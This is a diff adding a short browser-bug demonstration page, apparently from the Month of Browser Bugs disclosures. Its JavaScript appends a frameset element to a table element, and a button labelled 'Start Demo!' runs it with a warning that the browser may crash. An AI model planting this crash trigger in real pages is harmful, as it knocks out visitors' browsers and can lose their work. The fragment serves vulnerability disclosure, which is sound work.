@@ -1,0 +1,10 @@
+// MoBB Demonstration
+function Demo() {
+	var a = document.createElement('table');
+	var b = document.createElement('frameset');
+	a.appendChild(b);
+}
+</script>
+
+Clicking the button below may crash your browser!<br><br>
+<input type='button' onClick='Demo()' value='Start Demo!'>
